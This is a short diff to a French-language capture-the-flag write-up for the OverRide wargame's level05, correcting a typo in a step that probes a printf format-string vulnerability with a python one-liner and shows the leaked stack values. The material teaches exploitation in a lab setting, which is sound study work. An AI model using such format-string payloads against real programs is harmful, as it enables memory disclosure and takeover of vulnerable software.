@@ -21,7 +21,7 @@ OFFSET   TYPE              VALUE
 ```
 On trouve 0x080497e0
 
-Maintenat, on cherche l'offset auquel printf peut override
+Maintenant, on cherche l'offset auquel printf peut override
 ```
 level05@OverRide:~$ python -c 'print "B"*4 + "%08x."*20' | ./level05
 bbbb00000064.f7fcfac0.f7ec3add.ffffd66f.ffffd66e.00000000.ffffffff.ffffd6f4.f7fdb000.62626262.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.
